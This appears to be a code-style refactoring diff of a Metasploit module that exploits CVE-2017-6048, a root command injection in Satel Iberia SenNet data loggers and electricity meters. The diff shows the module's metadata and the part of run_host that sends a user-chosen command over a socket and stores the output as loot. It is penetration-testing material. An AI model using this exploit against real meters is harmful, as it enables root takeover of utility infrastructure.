@@ -9,25 +9,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability',
-      'Description' => %q{
-        This module exploits an OS Command Injection vulnerability in Satel Iberia SenNet Data Loggers & Electricity Meters
-        to perform arbitrary command execution as 'root'.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability',
+        'Description' => %q{
+          This module exploits an OS Command Injection vulnerability in Satel Iberia SenNet Data Loggers & Electricity Meters
+          to perform arbitrary command execution as 'root'.
+        },
+        'References' => [
           [ 'CVE', '2017-6048' ],
           [ 'URL', 'https://ipositivesecurity.com/2017/04/07/sennet-data-logger-appliances-and-electricity-meters-multiple-vulnerabilties/' ],
           [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-131-02' ]
         ],
-      'Author' =>
-        [
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'DisclosureDate' => '2017-04-07',
-      'License' => MSF_LICENSE,
-      'DefaultOptions' => { 'VERBOSE' => true })
+        'DisclosureDate' => '2017-04-07',
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => { 'VERBOSE' => true }
+      )
       )
 
     register_options(
@@ -41,8 +42,8 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('USERNAME', 'PASSWORD')
   end
 
-  def run_host(ip)
-    to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']
+  def run_host(_ip)
+    to = datastore['TIMEOUT'].zero? ? 30 : datastore['TIMEOUT']
     begin
       ::Timeout.timeout(to) do
         command = datastore['CMD']
@@ -53,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
 
         sock.puts(inject)
         data = sock.get_once(-1, to)
-        print_good("#{data}")
+        print_good(data.to_s)
 
         loot_name = 'cmd-exec-log'
         loot_type = 'text/plain'
